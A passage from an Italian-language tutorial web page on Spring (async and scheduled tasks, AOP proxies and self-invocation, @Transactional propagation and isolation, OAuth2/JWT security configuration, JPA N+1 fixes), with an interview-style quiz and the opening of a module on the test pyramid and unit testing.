    @Async
    public CompletableFuture&lt;Report&gt; generateReportAsync(Long userId) {
        Report report = reportGenerator.generate(userId);
        return CompletableFuture.completedFuture(report);
    }
}

@Component
public class ScheduledTasks {

    @Scheduled(fixedRate = 60000)  // Ogni 60 secondi
    public void checkHealth() {
        healthChecker.check();
    }

    @Scheduled(fixedDelay = 30000)  // 30 sec dopo la fine dell'esecuzione precedente
    public void processQueue() {
        queueProcessor.process();
    }

    @Scheduled(cron = "0 0 2 * * ?")  // Ogni giorno alle 2:00 AM
    public void nightlyCleanup() {
        cleanupService.run();
    }

    @Scheduled(cron = "0 */15 9-17 * * MON-FRI")  // Ogni 15 min, 9-17, Lun-Ven
    public void businessHoursTask() {
        // ...
    }
}</code></pre>

                <div class="info-box warning">
                    <h4>Attenzione con @Async</h4>
                    <p>Come <code>@Transactional</code>, anche <code>@Async</code> usa i proxy. La self-invocation non funziona! Inoltre, le eccezioni nei metodi async non vengono propagate al chiamante - usa un <code>AsyncUncaughtExceptionHandler</code> per gestirle.</p>
                </div>
            </section>

            <!-- Proxy Pattern Section -->
            <section class="section" id="modulo1-proxy">
                <h2>Proxy Pattern in Spring</h2>

                <p>Il <strong>Proxy Pattern</strong> è il meccanismo fondamentale attraverso cui Spring implementa l'<strong>Aspect-Oriented Programming</strong> (AOP). Quando annoti un bean con <code>@Transactional</code>, <code>@Cacheable</code>, <code>@Async</code>, o qualsiasi altro aspetto, Spring non usa direttamente la tua classe, ma crea un <em>proxy</em> che la avvolge.</p>

                <h3>JDK Dynamic Proxy vs CGLIB</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Caratteristica</th>
                            <th>JDK Dynamic Proxy</th>
                            <th>CGLIB Proxy</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Requisito</td>
                            <td>La classe deve implementare un'interfaccia</td>
                            <td>Nessun requisito (estende la classe)</td>
                        </tr>
                        <tr>
                            <td>Meccanismo</td>
                            <td>Implementa l'interfaccia a runtime</td>
                            <td>Crea una sottoclasse a runtime</td>
                        </tr>
                        <tr>
                            <td>Performance</td>
                            <td>Leggermente più veloce nella creazione</td>
                            <td>Leggermente più veloce nell'invocazione</td>
                        </tr>
                        <tr>
                            <td>Limitazioni</td>
                            <td>Solo metodi dell'interfaccia</td>
                            <td>No classi/metodi <code>final</code></td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box">
                    <h4>Spring Boot Default</h4>
                    <p>A partire da Spring Boot 2.0, il default è <code>proxyTargetClass=true</code>, quindi viene usato CGLIB anche quando la classe implementa un'interfaccia. Questo evita sorprese quando si fa cast della classe concreta.</p>
                </div>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────┐
│                    PROXY PATTERN IN SPRING                              │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   Client Code                                                           │
│       │                                                                 │
│       │ orderService.placeOrder()                                       │
│       ▼                                                                 │
│   ┌─────────────────────────────────────────────────┐                   │
│   │              PROXY (CGLIB/JDK)                  │                   │
│   │  ┌───────────────────────────────────────────┐  │                   │
│   │  │  1. Before Advice                         │  │                   │
│   │  │     - Apri transazione                    │  │                   │
│   │  │     - Log                                 │  │                   │
│   │  │     - Security check                      │  │                   │
│   │  └───────────────────────────────────────────┘  │                   │
│   │                      │                          │                   │
│   │                      ▼                          │                   │
│   │  ┌───────────────────────────────────────────┐  │                   │
│   │  │  2. Target Method Invocation              │  │                   │
│   │  │     orderService.placeOrder() [REAL]      │  │                   │
│   │  └───────────────────────────────────────────┘  │                   │
│   │                      │                          │                   │
│   │                      ▼                          │                   │
│   │  ┌───────────────────────────────────────────┐  │                   │
│   │  │  3. After Advice                          │  │                   │
│   │  │     - Commit/Rollback transazione         │  │                   │
│   │  │     - Log risultato                       │  │                   │
│   │  └───────────────────────────────────────────┘  │                   │
│   └─────────────────────────────────────────────────┘                   │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Il problema della Self-Invocation</h3>

                <p>Uno degli errori più comuni e insidiosi in Spring è la <strong>self-invocation</strong>: quando un metodo di un bean chiama un altro metodo dello stesso bean, il proxy viene bypassato.</p>

                <pre><code class="language-java">@Service
public class OrderService {

    @Transactional
    public void placeOrder(Order order) {
        // Logica di business
        validateOrder(order);  // ⚠️ SELF-INVOCATION!
        orderRepository.save(order);
    }

    @Transactional(propagation = Propagation.REQUIRES_NEW)
    public void validateOrder(Order order) {
        // Questa transazione NON verrà creata!
        // Il metodo viene chiamato direttamente, senza passare dal proxy
        auditRepository.save(new AuditLog(order));
    }
}</code></pre>

                <div class="info-box warning">
                    <h4>Perché accade?</h4>
                    <p>Quando chiami <code>this.validateOrder()</code> (anche implicitamente), stai chiamando il metodo sulla <em>classe reale</em>, non sul proxy. Il proxy non ha modo di intercettare chiamate interne.</p>
                </div>

                <h3>Soluzioni alla Self-Invocation</h3>

                <pre><code class="language-java">// Soluzione 1: Estrarre in un altro service
@Service
@RequiredArgsConstructor
public class OrderService {
    private final OrderValidationService validationService;

    @Transactional
    public void placeOrder(Order order) {
        validationService.validateOrder(order);  // ✅ Passa attraverso il proxy
        orderRepository.save(order);
    }
}

// Soluzione 2: Self-injection (meno elegante, ma funziona)
@Service
public class OrderService {
    @Autowired
    private OrderService self;  // Inietta il proxy di se stesso

    @Transactional
    public void placeOrder(Order order) {
        self.validateOrder(order);  // ✅ Passa attraverso il proxy
        orderRepository.save(order);
    }
}

// Soluzione 3: ApplicationContext (più verbosa)
@Service
public class OrderService implements ApplicationContextAware {
    private ApplicationContext context;

    @Override
    public void setApplicationContext(ApplicationContext ctx) {
        this.context = ctx;
    }

    @Transactional
    public void placeOrder(Order order) {
        context.getBean(OrderService.class).validateOrder(order);
    }
}</code></pre>
            </section>

            <!-- Transactional Section -->
            <section class="section" id="modulo1-transactional">
                <h2>Gestione delle Transazioni con @Transactional</h2>

                <p>La gestione dichiarativa delle transazioni è una delle feature più potenti di Spring. L'annotazione <code>@Transactional</code> permette di definire i confini transazionali in modo elegante, ma nasconde complessità che è fondamentale comprendere.</p>

                <h3>Attributi chiave di @Transactional</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Attributo</th>
                            <th>Default</th>
                            <th>Descrizione</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>propagation</code></td>
                            <td><code>REQUIRED</code></td>
                            <td>Come la transazione si propaga</td>
                        </tr>
                        <tr>
                            <td><code>isolation</code></td>
                            <td><code>DEFAULT</code></td>
                            <td>Livello di isolamento (dal DB)</td>
                        </tr>
                        <tr>
                            <td><code>readOnly</code></td>
                            <td><code>false</code></td>
                            <td>Ottimizzazione per query read-only</td>
                        </tr>
                        <tr>
                            <td><code>timeout</code></td>
                            <td><code>-1</code></td>
                            <td>Timeout in secondi</td>
                        </tr>
                        <tr>
                            <td><code>rollbackFor</code></td>
                            <td>RuntimeException</td>
                            <td>Eccezioni che causano rollback</td>
                        </tr>
                    </tbody>
                </table>

                <h3>Propagation Levels</h3>

                <pre><code class="language-java">// REQUIRED (default): usa la transazione esistente o ne crea una nuova
@Transactional(propagation = Propagation.REQUIRED)
public void methodA() {
    // Se c'è una transazione attiva, la usa
    // Altrimenti ne crea una nuova
}

// REQUIRES_NEW: sospende la transazione corrente e ne crea una nuova
@Transactional(propagation = Propagation.REQUIRES_NEW)
public void auditLog() {
    // Crea SEMPRE una nuova transazione
    // Se methodA() fa rollback, questo commit rimane
    auditRepository.save(log);
}

// NESTED: crea un savepoint nella transazione corrente
@Transactional(propagation = Propagation.NESTED)
public void nestedOperation() {
    // Se fallisce, rollback solo fino al savepoint
    // La transazione padre può decidere se continuare
}

// MANDATORY: DEVE esistere una transazione, altrimenti exception
@Transactional(propagation = Propagation.MANDATORY)
public void mustBeInTransaction() {
    // Lancia IllegalTransactionStateException se non c'è transazione
}

// NEVER: NON deve esistere una transazione
@Transactional(propagation = Propagation.NEVER)
public void mustNotBeInTransaction() {
    // Lancia exception se c'è una transazione attiva
}</code></pre>

                <div class="info-box warning">
                    <h4>Errore comune: Rollback su Checked Exception</h4>
                    <p>Per default, Spring fa rollback <strong>solo su RuntimeException</strong> e <code>Error</code>. Le checked exception (es: <code>IOException</code>) <strong>NON</strong> causano rollback automatico!</p>
                </div>

                <pre><code class="language-java">// ❌ Questa eccezione NON causa rollback!
@Transactional
public void processFile() throws IOException {
    orderRepository.save(order);
    throw new IOException("File not found");  // La transazione fa COMMIT!
}

// ✅ Soluzione: specificare rollbackFor
@Transactional(rollbackFor = Exception.class)
public void processFile() throws IOException {
    orderRepository.save(order);
    throw new IOException("File not found");  // Ora fa ROLLBACK
}</code></pre>

                <h3>Isolation Levels</h3>

                <p>I livelli di isolamento definiscono come le transazioni interagiscono tra loro e quali anomalie sono permesse:</p>

                <table>
                    <thead>
                        <tr>
                            <th>Isolation Level</th>
                            <th>Dirty Read</th>
                            <th>Non-Repeatable Read</th>
                            <th>Phantom Read</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>READ_UNCOMMITTED</code></td>
                            <td>Possibile</td>
                            <td>Possibile</td>
                            <td>Possibile</td>
                        </tr>
                        <tr>
                            <td><code>READ_COMMITTED</code></td>
                            <td>Prevenuto</td>
                            <td>Possibile</td>
                            <td>Possibile</td>
                        </tr>
                        <tr>
                            <td><code>REPEATABLE_READ</code></td>
                            <td>Prevenuto</td>
                            <td>Prevenuto</td>
                            <td>Possibile</td>
                        </tr>
                        <tr>
                            <td><code>SERIALIZABLE</code></td>
                            <td>Prevenuto</td>
                            <td>Prevenuto</td>
                            <td>Prevenuto</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box">
                    <h4>Glossario</h4>
                    <ul>
                        <li><strong>Dirty Read:</strong> leggere dati non ancora committati da un'altra transazione</li>
                        <li><strong>Non-Repeatable Read:</strong> leggere lo stesso record due volte e ottenere valori diversi</li>
                        <li><strong>Phantom Read:</strong> una query restituisce righe diverse se eseguita due volte (insert/delete da altre tx)</li>
                    </ul>
                </div>
            </section>

            <!-- Spring Security Section -->
            <section class="section" id="modulo1-security">
                <h2>Spring Security: OAuth2 & JWT</h2>

                <p>Spring Security è il framework de-facto per la sicurezza nelle applicazioni Spring. Nel contesto moderno, la maggior parte delle architetture utilizza <strong>OAuth2</strong> per l'autorizzazione e <strong>JWT</strong> (JSON Web Tokens) come formato per i token.</p>

                <h3>OAuth2 Flows</h3>

                <div class="diagram">
                    <pre>
┌──────────────────────────────────────────────────────────────────────────────┐
│                    AUTHORIZATION CODE FLOW (più sicuro)                      │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│    ┌────────┐          ┌───────────────┐         ┌──────────────────┐        │
│    │ Client │          │ Authorization │         │ Resource Server  │        │
│    │ (App)  │          │    Server     │         │     (API)        │        │
│    └───┬────┘          └───────┬───────┘         └────────┬─────────┘        │
│        │                       │                          │                  │
│        │  1. Redirect to       │                          │                  │
│        │     /authorize        │                          │                  │
│        │─────────────────────▶│                          │                  │
│        │                       │                          │                  │
│        │  2. User logs in      │                          │                  │
│        │     & consents        │                          │                  │
│        │◀─────────────────────│                          │                  │
│        │                       │                          │                  │
│        │  3. Authorization     │                          │                  │
│        │     Code (via         │                          │                  │
│        │     redirect)         │                          │                  │
│        │◀─────────────────────│                          │                  │
│        │                       │                          │                  │
│        │  4. Exchange code     │                          │                  │
│        │     for tokens        │                          │                  │
│        │     (backend only)    │                          │                  │
│        │─────────────────────▶│                          │                  │
│        │                       │                          │                  │
│        │  5. Access Token      │                          │                  │
│        │     + Refresh Token   │                          │                  │
│        │◀─────────────────────│                          │                  │
│        │                       │                          │                  │
│        │  6. API Request                                  │                  │
│        │     with Bearer Token ─────────────────────────▶│                  │
│        │                                                  │                  │
│        │  7. Protected Resource ◀─────────────────────────│                  │
│        │                                                  │                  │
└──────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>JWT Structure</h3>

                <p>Un JWT è composto da tre parti separate da punti: <code>header.payload.signature</code></p>

                <pre><code class="language-json">// Header (Base64)
{
  "alg": "RS256",
  "typ": "JWT"
}

// Payload (Base64) - CLAIMS
{
  "sub": "1234567890",           // Subject (user ID)
  "name": "Mario Rossi",
  "email": "mario@example.com",
  "roles": ["ROLE_USER", "ROLE_ADMIN"],
  "iat": 1699900000,             // Issued At
  "exp": 1699903600,             // Expiration
  "iss": "https://auth.myapp.com" // Issuer
}

// Signature
RSASHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  privateKey
)</code></pre>

                <h3>Configurazione Spring Security con JWT</h3>

                <pre><code class="language-java">@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        return http
            .csrf(csrf -> csrf.disable())  // Disabilitato per API stateless
            .sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/**").authenticated()
            )
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(jwt -> jwt
                    .jwtAuthenticationConverter(jwtAuthenticationConverter())
                )
            )
            .build();
    }

    @Bean
    public JwtAuthenticationConverter jwtAuthenticationConverter() {
        JwtGrantedAuthoritiesConverter authoritiesConverter =
            new JwtGrantedAuthoritiesConverter();
        authoritiesConverter.setAuthoritiesClaimName("roles");
        authoritiesConverter.setAuthorityPrefix("ROLE_");

        JwtAuthenticationConverter converter = new JwtAuthenticationConverter();
        converter.setJwtGrantedAuthoritiesConverter(authoritiesConverter);
        return converter;
    }
}</code></pre>

                <div class="info-box warning">
                    <h4>Security Best Practices</h4>
                    <ul>
                        <li>Usa <strong>RS256</strong> (asimmetrico) invece di HS256 per ambienti distribuiti</li>
                        <li>Mantieni i token di accesso con <strong>breve durata</strong> (15-30 min)</li>
                        <li>Usa <strong>Refresh Tokens</strong> con rotazione per sessioni lunghe</li>
                        <li><strong>Mai</strong> memorizzare dati sensibili nel payload JWT (è solo encoded, non encrypted)</li>
                        <li>Valida sempre <code>iss</code>, <code>aud</code>, <code>exp</code> claims</li>
                    </ul>
                </div>
            </section>

            <!-- JPA Section -->
            <section class="section" id="modulo1-jpa">
                <h2>Spring Data JPA & il Problema N+1</h2>

                <p>Il problema <strong>N+1</strong> è uno dei problemi di performance più comuni nelle applicazioni che usano un ORM. Si verifica quando il framework esegue una query per recuperare N entità, e poi N query aggiuntive per recuperare le relazioni di ciascuna.</p>

                <h3>Esempio del Problema N+1</h3>

                <pre><code class="language-java">@Entity
public class Order {
    @Id
    private Long id;

    @ManyToOne(fetch = FetchType.LAZY)
    private Customer customer;

    @OneToMany(mappedBy = "order", fetch = FetchType.LAZY)
    private List&lt;OrderItem&gt; items;
}

// Repository
public interface OrderRepository extends JpaRepository&lt;Order, Long&gt; {
    List&lt;Order&gt; findByStatus(OrderStatus status);
}

// Service - PROBLEMA N+1
@Service
public class OrderService {
    public List&lt;OrderDTO&gt; getActiveOrders() {
        List&lt;Order&gt; orders = orderRepository.findByStatus(ACTIVE);
        // Query 1: SELECT * FROM orders WHERE status = 'ACTIVE'

        return orders.stream()
            .map(order -> new OrderDTO(
                order.getId(),
                order.getCustomer().getName(),  // Query 2, 3, 4... N+1!
                order.getItems().size()          // Ancora N query!
            ))
            .toList();
    }
}</code></pre>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                         PROBLEMA N+1 QUERIES                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  Scenario: 100 ordini attivi, ognuno con customer e items                   │
│                                                                             │
│  Query 1:   SELECT * FROM orders WHERE status = 'ACTIVE'                    │
│                              │                                              │
│              ┌───────────────┼───────────────┐                              │
│              ▼               ▼               ▼                              │
│  Query 2:   SELECT * FROM customers WHERE id = 1                            │
│  Query 3:   SELECT * FROM customers WHERE id = 2                            │
│  ...                                                                        │
│  Query 101: SELECT * FROM customers WHERE id = 100                          │
│                              │                                              │
│              ┌───────────────┼───────────────┐                              │
│              ▼               ▼               ▼                              │
│  Query 102: SELECT * FROM order_items WHERE order_id = 1                    │
│  Query 103: SELECT * FROM order_items WHERE order_id = 2                    │
│  ...                                                                        │
│  Query 201: SELECT * FROM order_items WHERE order_id = 100                  │
│                                                                             │
│  TOTALE: 1 + 100 + 100 = 201 QUERY! (invece di 1-3 ottimali)                │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Soluzioni al Problema N+1</h3>

                <pre><code class="language-java">// Soluzione 1: JOIN FETCH (JPQL)
public interface OrderRepository extends JpaRepository&lt;Order, Long&gt; {

    @Query("""
        SELECT DISTINCT o FROM Order o
        LEFT JOIN FETCH o.customer
        LEFT JOIN FETCH o.items
        WHERE o.status = :status
        """)
    List&lt;Order&gt; findByStatusWithDetails(@Param("status") OrderStatus status);
}

// Soluzione 2: @EntityGraph (più dichiarativo)
public interface OrderRepository extends JpaRepository&lt;Order, Long&gt; {

    @EntityGraph(attributePaths = {"customer", "items"})
    List&lt;Order&gt; findByStatus(OrderStatus status);
}

// Soluzione 3: @BatchSize (per lazy loading ottimizzato)
@Entity
public class Order {
    @OneToMany(mappedBy = "order", fetch = FetchType.LAZY)
    @BatchSize(size = 25)  // Carica 25 collezioni alla volta
    private List&lt;OrderItem&gt; items;
}

// Soluzione 4: Projection (quando servono pochi campi)
public interface OrderSummary {
    Long getId();
    String getCustomerName();
    Integer getItemCount();
}

@Query("""
    SELECT o.id as id,
           c.name as customerName,
           SIZE(o.items) as itemCount
    FROM Order o
    JOIN o.customer c
    WHERE o.status = :status
    """)
List&lt;OrderSummary&gt; findOrderSummaries(@Param("status") OrderStatus status);</code></pre>

                <div class="info-box success">
                    <h4>Best Practice</h4>
                    <ul>
                        <li>Usa sempre <code>FetchType.LAZY</code> come default</li>
                        <li>Usa <code>JOIN FETCH</code> o <code>@EntityGraph</code> nelle query che necessitano delle relazioni</li>
                        <li>Attiva il logging delle query in sviluppo: <code>spring.jpa.show-sql=true</code></li>
                        <li>Usa strumenti come <strong>Hibernate Statistics</strong> o <strong>p6spy</strong> per monitorare</li>
                        <li>Considera <strong>Projections</strong> per DTOs read-only (migliore performance)</li>
                    </ul>
                </div>

                <div class="info-box warning">
                    <h4>Attenzione: MultipleBagFetchException</h4>
                    <p>Non puoi fare JOIN FETCH di due <code>List</code> contemporaneamente (Cartesian Product problem). Soluzioni:</p>
                    <ul>
                        <li>Cambia una delle collection in <code>Set</code></li>
                        <li>Usa due query separate con <code>@BatchSize</code></li>
                        <li>Usa <code>@Fetch(FetchMode.SUBSELECT)</code></li>
                    </ul>
                </div>
            </section>

            <!-- Quiz Section -->
            <section class="quiz-section" id="modulo1-quiz">
                <h2>Interactive Challenge Quiz</h2>
                <p style="color: var(--text-secondary); margin-bottom: 30px;">Metti alla prova la tua comprensione di Spring. Queste domande riflettono il livello di difficoltà dei colloqui nelle Big Tech.</p>

                <!-- Question 1 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q1.</span> Nel seguente codice, cosa succede quando viene chiamato <code>serviceA.methodA()</code>?</h4>
                    <pre><code class="language-java">@Service
public class ServiceA {
    @Transactional
    public void methodA() {
        // ... database operations ...
        methodB();
    }

    @Transactional(propagation = Propagation.REQUIRES_NEW)
    public void methodB() {
        // ... more database operations ...
        throw new RuntimeException("Error!");
    }
}</code></pre>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q1" id="q1a" value="a">
                            <label for="q1a">Solo methodB fa rollback, methodA fa commit (perché REQUIRES_NEW crea una nuova transazione)</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q1" id="q1b" value="b">
                            <label for="q1b">Entrambi i metodi fanno rollback perché l'eccezione si propaga</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q1" id="q1c" value="c">
                            <label for="q1c">Entrambi i metodi fanno rollback, ma NON perché REQUIRES_NEW funziona: il problema è la self-invocation</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q1" id="q1d" value="d">
                            <label for="q1d">L'applicazione non compila perché non si possono avere due @Transactional nello stesso service</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q1')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q1"></div>
                </div>

                <!-- Question 2 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q2.</span> Quale delle seguenti affermazioni sul JWT è <strong>FALSA</strong>?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q2" id="q2a" value="a">
                            <label for="q2a">Il payload del JWT è visibile a chiunque intercetti il token (è solo Base64 encoded)</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q2" id="q2b" value="b">
                            <label for="q2b">Un JWT con algoritmo RS256 può essere validato solo dal server che possiede la chiave privata</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q2" id="q2c" value="c">
                            <label for="q2c">Una volta emesso, un JWT non può essere revocato senza meccanismi aggiuntivi (come una blacklist)</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q2" id="q2d" value="d">
                            <label for="q2d">La signature del JWT garantisce che il payload non sia stato modificato dopo l'emissione</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q2')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q2"></div>
                </div>

                <!-- Question 3 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q3.</span> Quale combinazione di strategie risolve il problema N+1 per questa entity?</h4>
                    <pre><code class="language-java">@Entity
public class Department {
    @OneToMany(mappedBy = "department", fetch = FetchType.LAZY)
    private List&lt;Employee&gt; employees;

    @OneToMany(mappedBy = "department", fetch = FetchType.LAZY)
    private List&lt;Project&gt; projects;
}</code></pre>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q3" id="q3a" value="a">
                            <label for="q3a">Un singolo JOIN FETCH di entrambe le collection: <code>JOIN FETCH d.employees JOIN FETCH d.projects</code></label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q3" id="q3b" value="b">
                            <label for="q3b">Cambiare entrambe le collection in <code>FetchType.EAGER</code></label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q3" id="q3c" value="c">
                            <label for="q3c">Usare <code>@EntityGraph(attributePaths = {"employees", "projects"})</code></label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q3" id="q3d" value="d">
                            <label for="q3d">Cambiare una collection in Set, oppure usare due query separate con @BatchSize su entrambe</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q3')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q3"></div>
                </div>

                <!-- Question 4 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q4.</span> In quale fase del Bean Lifecycle vengono creati i proxy AOP?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q4" id="q4a" value="a">
                            <label for="q4a">Durante <code>postProcessAfterInitialization()</code> del BeanPostProcessor</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q4" id="q4b" value="b">
                            <label for="q4b">Durante l'instantiation del bean (fase 1)</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q4" id="q4c" value="c">
                            <label for="q4c">Durante <code>@PostConstruct</code></label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q4" id="q4d" value="d">
                            <label for="q4d">Durante <code>postProcessBeforeInitialization()</code></label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q4')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q4"></div>
                </div>

                <!-- Question 5 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q5.</span> Quale livello di isolamento previene i <strong>Phantom Reads</strong> ma permette i <strong>Non-Repeatable Reads</strong>?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q4" id="q5a" value="a">
                            <label for="q5a"><code>READ_COMMITTED</code></label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q5" id="q5b" value="b">
                            <label for="q5b"><code>REPEATABLE_READ</code></label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q5" id="q5c" value="c">
                            <label for="q5c">Nessuno: è impossibile prevenire Phantom Reads senza prevenire prima Non-Repeatable Reads</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q5" id="q5d" value="d">
                            <label for="q5d"><code>SERIALIZABLE</code></label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q5')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q5"></div>
                </div>
            </section>

            <!-- ==================== MODULO 2: TESTING STRATEGY ==================== -->

            <header class="module-header" id="modulo2" style="margin-top: 80px;">
                <span class="module-tag">Modulo 2</span>
                <h1>Testing Strategy</h1>
                <p>Dalla Test Pyramid al TDD: strategie e best practices per scrivere test efficaci e mantenibili</p>
            </header>

            <!-- Test Pyramid Section -->
            <section class="section" id="modulo2-pyramid">
                <h2>The Test Pyramid</h2>

                <p>La <strong>Test Pyramid</strong> è un modello concettuale introdotto da Mike Cohn che illustra come dovrebbe essere distribuito lo sforzo di testing in un progetto software. La forma piramidale indica che dovresti avere molti più test alla base (unit) e progressivamente meno salendo verso l'alto.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                           THE TEST PYRAMID                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                              ▲                                              │
│                             ╱ ╲            E2E / UI Tests                   │
│                            ╱   ╲           ─────────────────                │
│                           ╱     ╲          • Pochi (5-10%)                  │
│                          ╱  E2E  ╲         • Lenti (minuti)                 │
│                         ╱─────────╲        • Fragili                        │
│                        ╱           ╲       • Alto costo manutenzione        │
│                       ╱             ╲                                       │
│                      ╱───────────────╲                                      │
│                     ╱                 ╲    Integration Tests                │
│                    ╱    INTEGRATION    ╲   ──────────────────               │
│                   ╱                     ╲  • Moderati (15-25%)              │
│                  ╱───────────────────────╲ • Velocità media (secondi)       │
│                 ╱                         ╲• Testano interazioni            │
│                ╱                           ╲                                │
│               ╱─────────────────────────────╲                               │
│              ╱                               ╲  Unit Tests                  │
│             ╱            UNIT                 ╲ ────────────                │
│            ╱                                   ╲• Molti (70-80%)            │
│           ╱─────────────────────────────────────╲ Velocissimi (ms)         │
│          ╱                                       ╲• Isolati                 │
│         ╱                                         ╲• Facili da mantenere    │
│        ╱───────────────────────────────────────────╲                        │
│                                                                             │
│   COSTO ←──────────────────────────────────────────────────────────→ BASSO  │
│   ALTO                                                                      │
│                                                                             │
│   VELOCITÀ ←────────────────────────────────────────────────────────→ ALTA  │
│   BASSA                                                                     │
│                                                                             │
│   FEEDBACK ←────────────────────────────────────────────────────────→ RAPIDO│
│   LENTO                                                                     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <div class="info-box">
                    <h4>Perché questa forma?</h4>
                    <p>I test alla base (unit) sono <strong>veloci</strong>, <strong>economici</strong> da scrivere e mantenere, e forniscono <strong>feedback immediato</strong>. Salendo nella piramide, i test diventano più costosi, più lenti, e più fragili (prone a fallire per ragioni non legate al codice testato). L'obiettivo è massimizzare la copertura con i test più economici.</p>
                </div>

                <h3>Anti-Pattern: Ice Cream Cone</h3>

                <p>Molti team cadono nel pattern "Ice Cream Cone" (piramide invertita): troppi test E2E, pochi unit test. Questo porta a:</p>

                <ul>
                    <li><strong>Build lente</strong>: la CI impiega ore invece di minuti</li>
                    <li><strong>Feedback tardivo</strong>: scopri i bug solo alla fine della pipeline</li>
                    <li><strong>Flaky tests</strong>: test che falliscono in modo intermittente per timeout, race condition, o dipendenze esterne</li>
                    <li><strong>Paralisi del refactoring</strong>: paura di modificare il codice perché i test si rompono continuamente</li>
                </ul>

                <div class="info-box warning">
                    <h4>Domanda da colloquio</h4>
                    <p>"Come gestiresti una codebase con 500 test E2E e solo 50 unit test?"<br><br>
                    <strong>Risposta:</strong> Inizierei identificando i test E2E che verificano logica di business pura e li convertirei in unit test. Userei i test E2E esistenti come "safety net" temporanea mentre costruisco la copertura unit. Introdurrei metriche di code coverage per guidare le priorità e stabilirei una policy "no new E2E tests" per funzionalità testabili a livello unit.</p>
                </div>
            </section>

            <!-- Test Types Section -->
            <section class="section" id="modulo2-types">
                <h2>Unit vs Integration vs E2E Tests</h2>

                <h3>Unit Tests</h3>

                <p>Gli <strong>Unit Tests</strong> verificano il comportamento di una singola unità di codice (classe, metodo, funzione) in <strong>completo isolamento</strong>. Tutte le dipendenze esterne vengono sostituite con test doubles (mock, stub, fake).</p>

                <pre><code class="language-java">// Classe da testare
public class PriceCalculator {
    private final DiscountService discountService;
    private final TaxService taxService;

    public PriceCalculator(DiscountService discountService, TaxService taxService) {
        this.discountService = discountService;
        this.taxService = taxService;
    }

    public BigDecimal calculateFinalPrice(Product product, Customer customer) {
        BigDecimal basePrice = product.getPrice();
        BigDecimal discount = discountService.getDiscount(customer);
        BigDecimal discountedPrice = basePrice.multiply(BigDecimal.ONE.subtract(discount));
        BigDecimal tax = taxService.calculateTax(discountedPrice, customer.getCountry());
        return discountedPrice.add(tax);
    }
}

// Unit Test - isolato con mock
@ExtendWith(MockitoExtension.class)
class PriceCalculatorTest {

    @Mock
    private DiscountService discountService;

    @Mock
    private TaxService taxService;

    @InjectMocks
